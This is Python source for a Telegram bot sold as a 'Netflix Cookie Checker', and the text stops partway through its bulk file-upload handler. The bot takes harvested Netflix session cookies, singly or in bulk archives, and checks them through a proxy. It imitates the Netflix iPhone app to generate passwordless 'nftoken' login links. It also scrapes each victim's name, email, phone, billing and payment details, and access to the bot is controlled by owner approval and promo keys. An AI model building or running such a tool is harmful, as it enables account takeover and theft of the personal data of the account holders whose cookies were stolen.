import os
import asyncio
import logging
import re
import httpx
from typing import Dict, Optional, Tuple, Set
import time
from threading import Thread
import sys
import json
import codecs
import requests
import html
import zipfile
import tempfile
import shutil
import uuid
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# PostgreSQL / Supabase Integration
try:
    import psycopg2
    import psycopg2.extras
    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PORT = int(os.environ.get("PORT", 8000))
OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))
SUPABASE_URI = os.environ.get("SUPABASE_URI", os.environ.get("DATABASE_URL", ""))

# ========== EXTERNAL REDEEM API CONFIG ==========
REDEEM_API_KEY = os.environ.get("REDEEM_API_KEY", "")
REDEEM_BASE_URL = "https://xerodel.new.tg"

async def verify_redeem_code(code: str, telegram_id: int) -> dict:
    """Verifies a redeem code against the external service and returns the JSON response."""
    url = f"{REDEEM_BASE_URL}/api/redeem/verify"
    params = {"code": code, "telegram_id": telegram_id}
    headers = {"X-Api-Key": REDEEM_API_KEY}
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(url, params=params, headers=headers)
            return resp.json()
    except Exception as e:
        logger.error(f"Redeem API error: {e}")
        return {"ok": False, "error": "Verification service unreachable. Try again later."}
        
# ========== LOGGING SETUP ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ========== SUPABASE & ACCESS STORAGE SETUP ==========
APPROVED_USERS: Set[int] = {OWNER_ID}
AVAILABLE_KEYS: Dict[str, bool] = {}
TEMP_ACCESS_USERS: Dict[int, float] = {}

db_conn = None

def get_db_connection():
    global db_conn
    if not HAS_POSTGRES or not SUPABASE_URI:
        return None
    try:
        if db_conn is None or db_conn.closed != 0:
            db_conn = psycopg2.connect(SUPABASE_URI, sslmode='require')
            db_conn.autocommit = True
        return db_conn
    except Exception as e:
        logger.error(f"PostgreSQL connection error: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        logger.info("ℹ️ SUPABASE_URI not set or failed to connect. Operating with in-memory storage.")
        return
    try:
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS approved_users (
                    user_id BIGINT PRIMARY KEY
                );
                CREATE TABLE IF NOT EXISTS promo_keys (
                    code VARCHAR(64) PRIMARY KEY,
                    active BOOLEAN DEFAULT TRUE
                );
                CREATE TABLE IF NOT EXISTS temp_users (
                    user_id BIGINT PRIMARY KEY,
                    expires_at DOUBLE PRECISION NOT NULL
                );
            """)
        logger.info("✅ Supabase tables initialized successfully!")
        
        # Load state into memory
        with conn.cursor() as cur:
            cur.execute("SELECT user_id FROM approved_users;")
            for row in cur.fetchall():
                APPROVED_USERS.add(int(row[0]))
                
            cur.execute("SELECT code FROM promo_keys WHERE active = TRUE;")
            for row in cur.fetchall():
                AVAILABLE_KEYS[row[0]] = True
                
            cur.execute("SELECT user_id, expires_at FROM temp_users;")
            for row in cur.fetchall():
                TEMP_ACCESS_USERS[int(row[0])] = float(row[1])
                
        logger.info(f"📊 Loaded DB: {len(APPROVED_USERS)} approved users, {len(AVAILABLE_KEYS)} promo keys, {len(TEMP_ACCESS_USERS)} 24h temp users.")
    except Exception as e:
        logger.error(f"Error initializing database: {e}")

init_db()

# DB Helper Functions
def db_add_approved_user(user_id: int):
    APPROVED_USERS.add(user_id)
    conn = get_db_connection()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT (user_id) DO NOTHING;", (user_id,))
        except Exception as e:
            logger.error(f"DB Error in db_add_approved_user: {e}")

def db_remove_approved_user(user_id: int):
    if user_id in APPROVED_USERS:
        APPROVED_USERS.remove(user_id)
    conn = get_db_connection()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM approved_users WHERE user_id = %s;", (user_id,))
        except Exception as e:
            logger.error(f"DB Error in db_remove_approved_user: {e}")

def db_add_promo_key(code: str):
    AVAILABLE_KEYS[code] = True
    conn = get_db_connection()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO promo_keys (code, active) VALUES (%s, TRUE) ON CONFLICT (code) DO UPDATE SET active = TRUE;", (code,))
        except Exception as e:
            logger.error(f"DB Error in db_add_promo_key: {e}")

def db_burn_promo_key(code: str) -> bool:
    conn = get_db_connection()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM promo_keys WHERE code = %s AND active = TRUE RETURNING code;", (code,))
                deleted = cur.fetchone()
                if code in AVAILABLE_KEYS:
                    del AVAILABLE_KEYS[code]
                return bool(deleted)
        except Exception as e:
            logger.error(f"DB Error in db_burn_promo_key: {e}")
            return False
    else:
        if code in AVAILABLE_KEYS and AVAILABLE_KEYS[code]:
            del AVAILABLE_KEYS[code]
            return True
        return False

def db_set_temp_access(user_id: int, expiration_timestamp: float):
    TEMP_ACCESS_USERS[user_id] = expiration_timestamp
    conn = get_db_connection()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO temp_users (user_id, expires_at)
                    VALUES (%s, %s)
                    ON CONFLICT (user_id) DO UPDATE SET expires_at = EXCLUDED.expires_at;
                """, (user_id, expiration_timestamp))
        except Exception as e:
            logger.error(f"DB Error in db_set_temp_access: {e}")

# Global proxy state and bulk cancel event
CURRENT_PROXY: Optional[str] = None
cancel_bulk_event = asyncio.Event()

# ========== ACCESS CONTROL HELPER ==========
def is_approved(user_id: int) -> bool:
    if user_id == OWNER_ID or user_id in APPROVED_USERS:
        return True

    exp_time = None
    conn = get_db_connection()
    if conn:
        try:
            with conn.cursor() as cur:
                cur.execute("SELECT expires_at FROM temp_users WHERE user_id = %s;", (user_id,))
                row = cur.fetchone()
                if row:
                    exp_time = float(row[0])
        except Exception as e:
            logger.error(f"DB error checking user approval: {e}")

    if exp_time is None:
        exp_time = TEMP_ACCESS_USERS.get(user_id)

    if exp_time and time.time() < exp_time:
        return True
    elif exp_time:
        if conn:
            try:
                with conn.cursor() as cur:
                    cur.execute("DELETE FROM temp_users WHERE user_id = %s;", (user_id,))
            except Exception:
                pass
        if user_id in TEMP_ACCESS_USERS:
            del TEMP_ACCESS_USERS[user_id]
        return False

    return False

# ========== FLASK APP & HEALTH ENDPOINTS ==========
app = Flask(__name__)
application = None

@app.route("/", methods=["GET"])
def index():
    bot_status = "🟢 Running" if application else "🔴 Stopped"
    proxy_status = CURRENT_PROXY if CURRENT_PROXY else "❌ Not Set (Required)"
    db_connected = get_db_connection() is not None
    db_status = "🟢 Connected (Supabase / PostgreSQL)" if db_connected else "🟡 In-Memory"
    return f"""
    <html>
        <head>
            <title>Netflix Cookie Checker Bot</title>
            <style>
                body {{ font-family: Arial; margin: 40px; background-color: #f5f5f5; }}
                .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .status {{ padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .running {{ background-color: #d4edda; color: #155724; }}
                .stopped {{ background-color: #f8d7da; color: #721c24; }}
                h1 {{ color: #333; }}
                a {{ color: #007bff; text-decoration: none; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ Netflix Cookie Checker Bot</h1>
                <div class="status {'running' if application else 'stopped'}">
                    <p><b>Bot Status:</b> {bot_status}</p>
                    <p><b>Database:</b> {db_status}</p>
                    <p><b>Approved Users Count:</b> {len(APPROVED_USERS)}</p>
                    <p><b>Active Proxy:</b> {proxy_status}</p>
                    <p><b>Port:</b> {PORT}</p>
                </div>
                <hr>
                <p><a href="/health">Check Health Endpoint</a></p>
            </div>
        </body>
    </html>
    """, 200

@app.route("/health", methods=["GET"])
def health():
    return {
        "status": "healthy" if application else "unhealthy",
        "bot_running": application is not None,
        "db_connected": get_db_connection() is not None,
        "approved_users_count": len(APPROVED_USERS),
        "proxy_set": bool(CURRENT_PROXY),
        "timestamp": time.time()
    }, 200 if application else 503

# ========== START & HELP MESSAGES ==========
START_TEXT = (
    "👋 Netflix Cookie Checker Bot\n\n"
    "⚠️ Paste the cookie or upload `.txt` file, `.zip` archive to get your login link.\n\n"
    "Available Commands:\n"
    "• /redeem `<code>` — Claim 24-hour promo access\n"
    "• /help — Usage instructions\n\n"
    " Bot by @zyokr 🦖"
)

HELP_TEXT = (
    "How to use:\n"
    "1. Access is restricted. Ask owner for approval or claim a key with `/redeem <code>`.\n"
    "2. Contact owner if any problem persists.\n"
    "3. Paste cookies as text, upload a `.txt` file, or upload a `.zip` archive.\n"
    "4. If you face (Error Processing Document) then upload the cookie again."
)

COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)

# ========== PROXY & PARSING HELPERS ==========
def _format_proxy_string(raw_proxy: str) -> str:
    proxy = raw_proxy.strip()
    scheme = "http://"
    if proxy.startswith("http://"):
        proxy = proxy[7:]
    elif proxy.startswith("https://"):
        scheme = "https://"
        proxy = proxy[8:]

    parts = proxy.split(":")
    if len(parts) == 4:
        user, password, host, port = parts
        return f"{scheme}{user}:{password}@{host}:{port}"
    return f"{scheme}{proxy}"

def _get_request_proxies() -> Optional[Dict[str, str]]:
    if CURRENT_PROXY:
        return {"http": CURRENT_PROXY, "https": CURRENT_PROXY}
    return None

def _is_proxy_live(proxy_str: str) -> Tuple[bool, str]:
    proxies = {"http": proxy_str, "https": proxy_str}
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=6, verify=False)
        if r.status_code == 200:
            ip = r.json().get("origin", "Unknown IP")
            return True, f"Live! Outbound IP: `{ip}`"
        return False, f"Failed with status code {r.status_code}"
    except Exception as e:
        return False, str(e)

def _is_json_cookie(text: str) -> bool:
    text = text.strip()
    if not (text.startswith('[') and text.endswith(']')):
        return False
    try:
        json.loads(text)
        return True
    except Exception:
        return False

def _is_netscape_cookie(text: str) -> bool:
    lines = text.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        delimiter = '\t' if '\t' in line else ' '
        parts = line.split(delimiter)
        if len(parts) >= 7:
            return True
    return False

def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    try:
        cookies_array = json.loads(json_str)
        kv: Dict[str, str] = {}
        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name = cookie_obj.get('name', '')
                    value = cookie_obj.get('value', '')
                    if name and value:
                        kv[name] = value
        return kv
    except Exception:
        return {}

def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    kv: Dict[str, str] = {}
    lines = netscape_str.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        delimiter = '\t' if '\t' in line else ' '
        parts = line.split(delimiter)
        if len(parts) >= 7:
            name, value = parts[5], parts[6]
            if name and value:
                kv[name] = value
    return kv

def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]

    kv: Dict[str, str] = {}
    for part in parts:
        m = COOKIE_KV_RE.match(part)
        if m:
            kv[m.group(1).strip()] = m.group(2).strip()
    return kv

def _build_cookie_header(cookie_input: str) -> Optional[str]:
    if _is_json_cookie(cookie_input):
        kv = _extract_json_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    if _is_netscape_cookie(cookie_input):
        kv = _extract_netscape_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])

    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
    kv = _extract_cookie_kv_pairs(cleaned)
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])
    return None

def _split_multiple_cookies(text: str) -> list[str]:
    text = text.strip()
    if _is_json_cookie(text):
        return [text]
    blocks = re.split(r'\n\s*\n', text)
    cookie_list = []
    for block in blocks:
        block = block.strip()
        if not block:
            continue
        lines = block.splitlines()
        if any("netflixid" in line.lower() for line in lines):
            cookie_list.append(block)
        else:
            for line in lines:
                if "netflixid" in line.lower():
                    cookie_list.append(line)
    return cookie_list if cookie_list else [text]

def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = [t.split("=")[0].strip() for t in cookie_header.split(";") if "=" in t]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")

# ========== NETFLIX CHECKER ENGINE ==========
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "accept-language": "en-US;q=1",
}

def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            k, v = token.split("=", 1)
            if k.strip().lower() == "netflixid":
                return v.strip()
    return None

def _generate_nftoken(cookie_header: str) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
    if not netflix_id:
        return False, "Invalid or expired cookie. NetflixId not found.", None

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            proxies=_get_request_proxies(),
            timeout=(5, 15),
            verify=False,
        )
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        nftoken = td.get("token")

        if not nftoken:
            return False, "Invalid or expired cookie. Token generation failed.", None
        return True, "Valid nftoken generated.", nftoken
    except Exception as e:
        logger.error(f"Error generating nftoken: {e}")
        return False, "Invalid or expired cookie.", None

def decode_text(value):
    if value is None:
        return "Unknown"
    value = str(value)
    try:
        value = codecs.decode(value, "unicode_escape")
    except Exception:
        pass
    value = html.unescape(value)
    value = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: bytes.fromhex(m.group(1)).decode('latin1'), value)
    return value.strip()

def _check_netflix_cookie(cookie_header: str) -> Dict[str, str]:
    cookie_dict: Dict[str, str] = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            k, v = token.split("=", 1)
            cookie_dict[k.strip()] = v.strip()

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId found in cookies"}

    session = requests.Session()
    session.cookies.update(cookie_dict)
    session.cookies.set("nf_lang", "en", domain=".netflix.com")
    session.cookies.set("cl_lang", "en-US", domain=".netflix.com")

    if CURRENT_PROXY:
        session.proxies.update(_get_request_proxies())

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Netflix.Context.Locales": "en-US",
    }

    try:
        r = session.get("https://www.netflix.com/YourAccount?locale=en-US", headers=headers, timeout=(5, 15), verify=False)
        if r.status_code != 200 or ("login" in r.url.lower()) or ("signin" in r.url.lower()):
            return {"ok": False, "reason": "Redirected to login or HTTP error"}

        txt = r.text or ""
        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)
            return decode_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"') or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')

        has_payment_issue = bool(re.search(r"(?i)(fix\s+your\s+payment|didn['’]t\s+go\s+through|retry\s+payment|actualizar\s+forma\s+de\s+pago)", txt))
        is_hold = bool(re.search(r'"(isPaymentProblem|isHold)"\s*:\s*true', txt, re.I))

        if has_payment_issue or is_hold:
            payment_status = "Action Required (Payment Failed)"
        else:
            payment_status = "Active / Paid"

        profiles: list = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles?locale=en-US", timeout=6, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        return {
            "ok": True,
            "name": name or "Unknown",
            "email": email or "Unknown",
            "country": country or "Unknown",
            "plan": plan_raw or "Unknown",
            "plan_price": plan_price or "N/A",
            "member_since": member_since or "Unknown",
            "next_billing": next_billing or "Unknown",
            "payment_method": payment or "CC",
            "payment_status": payment_status,
            "phone": phone or "N/A",
            "has_phone": "Yes" if phone else "No",
            "video_quality": quality or "HD",
            "max_streams": streams or "2",
            "extra_member": "Yes" if "showExtraMemberSection" in txt else "No",
            "email_verified": "Yes" if '"emailVerified":true' in txt else "No",
            "membership_status": "CURRENT_MEMBER",
            "profiles": ", ".join(decode_text(p) for p in profiles) if profiles else (name or "Unknown"),
            "connected_profiles": str(len(profiles)) if profiles else "1"
        }
    except Exception as e:
        return {"ok": False, "reason": str(e)}

def _generate_results_txt(valid_accounts: list, filename: str) -> str:
    lines = [
        "==================================================",
        f" NETFLIX COOKIE CHECKER REPORT - {filename}",
        f" Generated At: {time.strftime('%Y-%m-%d %H:%M:%S')}",
        f" Total Valid Accounts Found: {len(valid_accounts)}",
        "==================================================\n"
    ]
    for idx, acct in enumerate(valid_accounts, start=1):
        nftoken = acct.get('nftoken', '')
        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}" if nftoken else "N/A"
        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}" if nftoken else "N/A"

        lines.extend([
            f"--- ACCOUNT #{idx} [{acct.get('source_tag', 'Cookie')}] ---",
            f"Name           : {acct.get('name', 'Unknown')}",
            f"Email          : {acct.get('email', 'Unknown')}",
            f"Country        : {acct.get('country', 'Unknown')}",
            f"Plan           : {acct.get('plan', 'Unknown')}",
            f"Price          : {acct.get('plan_price', 'N/A')}",
            f"Member Since   : {acct.get('member_since', 'Unknown')}",
            f"Next Billing   : {acct.get('next_billing', 'Unknown')}",
            f"Payment Method : {acct.get('payment_method', 'CC')}",
            f"Payment Status : {acct.get('payment_status', 'Active / Paid')}",
            f"Phone Number   : {acct.get('phone', 'N/A')} (Has Phone: {acct.get('has_phone', 'No')})",
            f"Video Quality  : {acct.get('video_quality', 'HD')}",
            f"Max Streams    : {acct.get('max_streams', '2')}",
            f"Extra Member   : {acct.get('extra_member', 'No')}",
            f"Email Verified : {acct.get('email_verified', 'No')}",
            f"Profiles       : {acct.get('profiles', 'Unknown')}",
            f"💻 Desktop Link : {desktop_link}",
            f"📱 Phone Link   : {phone_link}",
            "--------------------------------------------------\n"
        ])
    return "\n".join(lines)

# ========== ADMIN & PROMO COMMANDS ==========
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: `/approve <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0].strip())
        db_add_approved_user(target_id)
        await update.message.reply_text(f"✅ User `{target_id}` permanently approved!", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID.")

async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: `/disapprove <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0].strip())
        if target_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot disapprove Owner!")
            return
        db_remove_approved_user(target_id)
        await update.message.reply_text(f"🚫 Revoked access for user `{target_id}`.", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID.")

async def approved_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    users_text = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
    await update.message.reply_text(f"👥 Approved Users List:\n\n{users_text}", parse_mode="Markdown")

async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    code = context.args[0].strip().upper() if context.args else f"VIP-{uuid.uuid4().hex[:8].upper()}"
    db_add_promo_key(code)
    await update.message.reply_text(
        f"🎟️ **New 24-Hour Key Generated!**\n\n"
        f"• Code: `{code}`\n"
        f"• Redeem command: `/redeem {code}`",
        parse_mode="Markdown"
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: <code>/redeem &lt;code&gt;</code>", parse_mode="HTML")
        return

    code = context.args[0].strip()
    status_msg = await update.message.reply_text("🔄 Verifying promo code...")

    result = await verify_redeem_code(code, user_id)

    if result and result.get("ok"):
        # Use duration from API response if provided (in hours or seconds), otherwise default to 24h
        hours = result.get("hours") or result.get("duration_hours") or 24
        expires_at = result.get("expires_at")

        if expires_at and isinstance(expires_at, (int, float)) and expires_at > time.time():
            exp_time = float(expires_at)
        else:
            exp_time = time.time() + (float(hours) * 3600)

        db_set_temp_access(user_id, exp_time)

        await status_msg.edit_text(
            f"🎉 <b>Promo Code Claimed!</b>\n\n"
            f"Granted <b>{int(hours)}-Hour Access</b> to your account (<code>{user_id}</code>).",
            parse_mode="HTML"
        )
    else:
        error_reason = html.escape(str(result.get("error", "Invalid or already used promo key."))) if result else "Invalid or already used promo key."
        await status_msg.edit_text(f"❌ {error_reason}", parse_mode="HTML")

# ========== TELEGRAM HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied!\nUser ID: `{user_id}`.\nUse `/redeem <code>` or ask owner for access.", parse_mode="Markdown")
        return
    await update.message.reply_text(START_TEXT, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
        return
    await update.message.reply_text(HELP_TEXT)

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
        return
    global CURRENT_PROXY
    if not context.args:
        await update.message.reply_text("Usage: `/addproxy host:port` or `user:pass@host:port`", parse_mode="Markdown")
        return

    formatted_proxy = _format_proxy_string(context.args[0].strip())
    msg = await update.message.reply_text("🔄 Testing proxy...")
    loop = asyncio.get_running_loop()
    is_live, status_detail = await loop.run_in_executor(None, _is_proxy_live, formatted_proxy)

    if is_live:
        CURRENT_PROXY = formatted_proxy
        await msg.edit_text(f"✅ Proxy Set!\n`{formatted_proxy}`\n{status_detail}", parse_mode="Markdown")
    else:
        await msg.edit_text(f"❌ Proxy Failed: {status_detail}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        return
    cancel_bulk_event.set()
    await update.message.reply_text("🛑 Stop signal set! Halting check...")

async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    cookie_header = _build_cookie_header(update.message.text.strip())
    if not cookie_header:
        return
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! ID: `{user_id}`", parse_mode="Markdown")
        return
    if not CURRENT_PROXY:
        await update.message.reply_text("⚠️ Set a proxy first with `/addproxy`", parse_mode="Markdown")
        return

    msg = await update.message.reply_text("🔎 Checking cookie...")
    loop = asyncio.get_running_loop()
    ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

    if ok and nftoken:
        acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"

        formatted_text = (
            f"📁 Source: Pasted Cookie\n✅ Status: Valid Account\n\n"
            f"👤 Account Details:\n"
            f"• Name: {acct.get('name')}\n"
            f"• Email: {acct.get('email')}\n"
            f"• Country: {acct.get('country')}\n"
            f"• Plan: {acct.get('plan')}\n"
            f"• Price: {acct.get('plan_price')}\n"
            f"• Member Since: {acct.get('member_since')}\n"
            f"• Next Billing: {acct.get('next_billing')}\n"
            f"• Payment Status: {acct.get('payment_status')}\n"
            f"• Profiles: {acct.get('profiles')}"
        )
        markup = InlineKeyboardMarkup([[
            InlineKeyboardButton("💻 PC Login", url=desktop_link),
            InlineKeyboardButton("📱 Phone Login", url=phone_link)
        ]])
        await msg.edit_text(formatted_text, reply_markup=markup)
    else:
        await msg.edit_text(f"❌ {detail}")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    filename = document.file_name or "document"
    if not filename.endswith(('.txt', '.zip')):
        return
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! ID: `{user_id}`", parse_mode="Markdown")
        return
    if not CURRENT_PROXY:
        await update.message.reply_text("⚠️ Set a proxy first with `/addproxy`", parse_mode="Markdown")
        return

    cancel_bulk_event.clear()
    status_msg = await update.message.reply_text(f"📥 Downloading `{filename}`...")
    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, filename)

    try:
        tg_file = await context.bot.get_file(document.file_id, read_timeout=60, write_timeout=60)
        await tg_file.download_to_drive(file_path)

        raw_files = []
        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            for root, _, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith('.txt'):
                        raw_files.append(os.path.join(root, f))
        else:
            raw_files.append(file_path)

        cookie_queue = []
        for f_path in raw_files:
            try:
                with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                extracted = _split_multiple_cookies(content)
                fname = os.path.basename(f_path)
                for idx, c_text in enumerate(extracted, start=1):
                    cookie_queue.append((f"{fname} (#{idx})", c_text))
            except Exception:
                pass

        total_cookies = len(cookie_queue)
        valid_count, dead_count = 0, 0
        valid_accounts_list = []
